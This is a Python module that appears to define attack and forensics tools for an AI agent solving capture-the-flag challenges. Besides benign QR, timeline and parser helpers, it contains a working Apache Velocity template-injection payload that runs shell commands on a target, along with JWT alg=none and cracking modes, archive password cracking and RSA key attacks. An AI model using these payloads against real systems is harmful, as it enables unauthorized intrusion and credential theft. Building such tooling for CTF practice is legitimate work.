"""Structured wrappers for pinned, high-yield competition tools."""

from __future__ import annotations

import base64
import re
import shlex

from midnight.env.ctf_environment import CTFEnvironment
from midnight.tools.category import _challenge_url, _result_text
from midnight.tools.registry import register_tool


@register_tool(name="qr_decode", groups=["misc", "forensics"])
def make_qr_decode(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def qr_decode(image: str, output_dir: str = ".midnight-qr") -> str:
        """Decode a local QR image after trying bounded normalization variants.

        Use after extracting or reconstructing a likely QR code. The action
        tries the original, nearest-neighbor scaling, grayscale thresholds, and
        inversion, then reports only decoder-confirmed payloads.
        """
        source = shlex.quote(image)
        destination = shlex.quote(output_dir)
        command = (
            f"test -f {source} || {{ echo '[error] image not found' >&2; exit 2; }}; "
            f"rm -rf -- {destination}; mkdir -p -- {destination}; "
            f"convert {source} -filter point -resize 800% {destination}/scaled.png; "
            f"convert {destination}/scaled.png -colorspace Gray -threshold 35% {destination}/t35.png; "
            f"convert {destination}/scaled.png -colorspace Gray -threshold 50% {destination}/t50.png; "
            f"convert {destination}/scaled.png -colorspace Gray -threshold 65% {destination}/t65.png; "
            f"convert {destination}/t50.png -negate {destination}/inverted.png; "
            "found=0; for candidate in "
            f"{source} {destination}/scaled.png {destination}/t35.png {destination}/t50.png "
            f"{destination}/t65.png {destination}/inverted.png; do "
            "decoded=$(zbarimg --quiet --raw \"$candidate\" 2>/dev/null) || true; "
            "if test -n \"$decoded\"; then printf '[decoded:%s]\\n%s\\n' \"$candidate\" \"$decoded\"; found=1; fi; "
            "done; test \"$found\" -eq 1 || { echo '[no QR payload decoded]' >&2; exit 3; }"
        )
        return _result_text(await env.exec(command, timeout=180))

    return qr_decode


@register_tool(name="archive_password", groups=["misc", "forensics"])
def make_archive_password(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def archive_password(
        archive: str,
        wordlist: str = "/opt/midnight/wordlists/ctf-small.txt",
        timeout_seconds: int = 120,
    ) -> str:
        """Recover a ZIP/RAR/7z password with a bounded local candidate list.

        The bundled list is deliberately small. Supply a challenge-derived
        local wordlist when names, metadata, hints, or recovered strings exist.
        """
        if timeout_seconds < 10 or timeout_seconds > 300:
            raise ValueError("timeout_seconds must be between 10 and 300")
        source = shlex.quote(archive)
        words = shlex.quote(wordlist)
        command = (
            f"test -f {source} || {{ echo '[error] archive not found' >&2; exit 2; }}; "
            f"test -f {words} || {{ echo '[error] wordlist not found' >&2; exit 2; }}; "
            f"case {source} in "
            f"*.zip|*.ZIP) timeout {timeout_seconds}s fcrackzip -u -D -p {words} {source} ;; "
            "*.rar|*.RAR|*.7z) "
            "found=''; while IFS= read -r candidate; do "
            "test -n \"$candidate\" || continue; "
            f"if 7z t -y -p\"$candidate\" {source} >/dev/null 2>&1; then "
            "found=$candidate; break; fi; done < "
            f"{words}; test -n \"$found\" && printf 'PASSWORD FOUND: %s\\n' \"$found\" ;; "
            "*) echo '[error] supported extensions: zip, rar, 7z' >&2; exit 2 ;; esac"
        )
        return _result_text(await env.exec(command, timeout=timeout_seconds + 30))

    return archive_password


@register_tool(name="tinja_ssti", groups=["web"])
def make_tinja_ssti(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def tinja_ssti(
        url: str = "",
        data: str = "",
        headers: str = "",
        cookies: str = "",
        requests_per_second: int = 20,
    ) -> str:
        """Fingerprint SSTI across many template engines on the challenge endpoint.

        Use after identifying a reflected parameter but before assuming Jinja2.
        Headers are semicolon-separated. ``data`` selects a POST request.
        """
        if requests_per_second < 1 or requests_per_second > 100:
            raise ValueError("requests_per_second must be between 1 and 100")
        target = _challenge_url(url, remote)
        parts = ["tinja", "url", "-u", target, "--ratelimit", str(requests_per_second)]
        if data:
            parts += ["--data", data]
        if cookies:
            parts += ["--cookie", cookies]
        for header in (item.strip() for item in headers.split(";") if item.strip()):
            if ":" not in header:
                raise ValueError("each header must use Name: value syntax")
            parts += ["--header", header]
        command = "command -v tinja >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        result = await env.exec(command, timeout=300)
        if observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return tinja_ssti


@register_tool(name="velocity_ssti", groups=["web"])
def make_velocity_ssti(
    *, env: CTFEnvironment, state=None, observe_target_output=None, **_
) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def velocity_ssti(
        command: str,
        url: str = "",
        parameter: str = "text",
        max_output_bytes: int = 512,
    ) -> str:
        """Run a bounded command through a confirmed Apache Velocity 1.x SSTI.

        First use ``id`` or ``ls /`` as evidence. The tool reads process output
        as byte values and decodes it locally, avoiding fragile reflection over
        Java Scanner constructors. Use only on the bound challenge target.
        """
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]{0,63}", parameter):
            raise ValueError("parameter contains unsupported characters")
        if not command or len(command) > 500 or any(char in command for char in "\r\n\0"):
            raise ValueError("command must be a non-empty single line of at most 500 characters")
        if max_output_bytes < 32 or max_output_bytes > 4096:
            raise ValueError("max_output_bytes must be between 32 and 4096")
        target = _challenge_url(url, remote)
        escaped = command.replace("\\", "\\\\").replace('"', '\\"')
        payload = (
            '#set($x="")\n'
            '#set($rt=$x.getClass().forName("java.lang.Runtime"))\n'
            f'#set($p=$rt.getRuntime().exec("{escaped}"))\n'
            '$p.waitFor()\n#set($is=$p.getInputStream())\n'
            f'#foreach($i in [1..{max_output_bytes}])$is.read(),#end'
        )
        url_b64 = base64.b64encode(target.encode()).decode()
        parameter_b64 = base64.b64encode(parameter.encode()).decode()
        payload_b64 = base64.b64encode(payload.encode()).decode()
        script = (
            "import base64,html,re,requests;"
            f"u=base64.b64decode('{url_b64}').decode();"
            f"k=base64.b64decode('{parameter_b64}').decode();"
            f"p=base64.b64decode('{payload_b64}').decode();"
            "r=requests.post(u,data={k:p},timeout=20);r.raise_for_status();"
            "m=re.search(r'<h2[^>]*class=[\"\\\']fire[\"\\\'][^>]*>(.*?)</h2>',r.text,re.S|re.I);"
            "s=html.unescape(m.group(1) if m else r.text);"
            "v=[int(x) for x in re.findall(r'(?<![0-9])-?[0-9]+(?=,)',s)];"
            "v=[x for x in v if 0<=x<=255];"
            "print(bytes(v).decode('utf-8','replace'))"
        )
        result = await env.exec(f"python3 -c {shlex.quote(script)}", timeout=60)
        if observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return velocity_ssti


@register_tool(name="jwt_analyze", groups=["web"])
def make_jwt_analyze(*, env: CTFEnvironment, state=None, observe_target_output=None, **_) -> object:
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")

    @tool
    async def jwt_analyze(
        token: str,
        mode: str = "decode",
        url: str = "",
        location: str = "authorization",
        cookie_name: str = "jwt",
        canary: str = "",
        wordlist: str = "",
    ) -> str:
        """Decode, test alg=none, scan, or crack a JWT with jwt_tool.

        ``scan`` is bound to the challenge endpoint. ``crack`` requires a local
        wordlist. Generated tokens must be verified with a target request.
        """
        if mode not in {"decode", "alg-none", "scan", "crack"}:
            raise ValueError("mode must be decode, alg-none, scan, or crack")
        if location not in {"authorization", "cookie"}:
            raise ValueError("location must be authorization or cookie")
        if not re.fullmatch(r"[A-Za-z0-9_.-]{1,80}", cookie_name):
            raise ValueError("cookie_name contains unsupported characters")
        parts = ["jwt_tool", token]
        if mode == "alg-none":
            parts += ["-X", "a"]
        elif mode == "crack":
            if not wordlist:
                raise ValueError("crack mode requires a local wordlist")
            parts += ["-C", "-d", wordlist]
        elif mode == "scan":
            target = _challenge_url(url, remote)
            parts += ["-t", target, "-M", "pb"]
            if location == "authorization":
                parts += ["-rh", f"Authorization: Bearer {token}"]
            else:
                parts += ["-rc", f"{cookie_name}={token}"]
            if canary:
                parts += ["-cv", canary]
        command = "command -v jwt_tool >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        result = await env.exec(command, timeout=300)
        if mode == "scan" and observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return jwt_analyze


@register_tool(name="rsa_attack", groups=["crypto"])
def make_rsa_attack(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    allowed_attacks = {
        "quick",
        "common_factors",
        "common_modulus_related_message",
        "cube_root",
        "fermat",
        "hastads",
        "partial_q",
        "pollard_rho",
        "roca",
        "smallq",
        "small_crt_exp",
        "smallfraction",
        "wiener",
        "z3_solver",
    }

    @tool
    async def rsa_attack(
        public_key: str,
        ciphertext_file: str = "",
        attack: str = "quick",
        recover_private: bool = True,
    ) -> str:
        """Run pinned RsaCtfTool attacks against a local PEM/public-key file.

        Use ``rsa_quickcheck`` for raw n/e/c first. This action covers key-file
        parsing and a bounded offline attack family without querying FactorDB.
        """
        if attack not in allowed_attacks:
            raise ValueError("attack is not in Midnight's offline allowlist")
        parts = ["RsaCtfTool", "--publickey", public_key]
        if ciphertext_file:
            parts += ["--decryptfile", ciphertext_file]
        if attack == "quick":
            parts += ["--attack", "wiener", "fermat", "smallq", "pollard_rho"]
        else:
            parts += ["--attack", attack]
        if recover_private or not ciphertext_file:
            parts.append("--private")
        command = "command -v RsaCtfTool >/dev/null || exit 127; timeout 300s " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=315))

    return rsa_attack


@register_tool(name="hayabusa_timeline", groups=["forensics"])
def make_hayabusa_timeline(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def hayabusa_timeline(
        path: str,
        output: str = "/ctf/hayabusa_timeline.csv",
        minimum_level: str = "informational",
        directory: bool = False,
    ) -> str:
        """Build an offline Sigma-backed timeline from one EVTX or a directory.

        The output remains in the challenge workspace. Start broad, then pivot
        on users, processes, logons, services, PowerShell, and timestamps.
        """
        if minimum_level not in {"informational", "low", "medium", "high", "critical"}:
            raise ValueError("minimum_level is invalid")
        source = shlex.quote(path)
        destination = shlex.quote(output)
        selector = "-d" if directory else "-f"
        command = (
            "command -v hayabusa >/dev/null || exit 127; "
            f"src=$(realpath -- {source}) || exit 2; dst=$(realpath -m -- {destination}) || exit 2; "
            f"cd /opt/hayabusa && ./hayabusa.bin dfir-timeline {selector} \"$src\" -o \"$dst\" "
            f"--min-level {shlex.quote(minimum_level)} -w -C -q -N -K; "
            f"echo '[timeline]'; wc -l \"$dst\"; "
            f"head -1 \"$dst\"; "
            f"grep -Eina 'powershell|cmd.exe|rundll32|certutil|logon|service|scheduled|clear' "
            f"\"$dst\" | head -220"
        )
        return _result_text(await env.exec(command, timeout=600))

    return hayabusa_timeline


@register_tool(name="kaitai_compile", groups=["reverse"])
def make_kaitai_compile(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def kaitai_compile(
        specification: str,
        target: str = "python",
        output_dir: str = "kaitai_out",
    ) -> str:
        """Compile a local Kaitai .ksy protocol specification into parser code.

        Write the observed framing and fields as a small .ksy file first. The
        generated parser should be round-trip checked against captured frames.
        """
        if target not in {"python", "javascript", "java", "csharp", "go", "rust"}:
            raise ValueError("target is not in the supported allowlist")
        parts = ["ksc", "-t", target, "--outdir", output_dir, specification]
        command = (
            "command -v ksc >/dev/null || exit 127; mkdir -p -- "
            + shlex.quote(output_dir)
            + "; "
            + " ".join(shlex.quote(part) for part in parts)
            + "; status=$?; find "
            + shlex.quote(output_dir)
            + " -maxdepth 3 -type f -print | head -80; exit $status"
        )
        return _result_text(await env.exec(command, timeout=180))

    return kaitai_compile
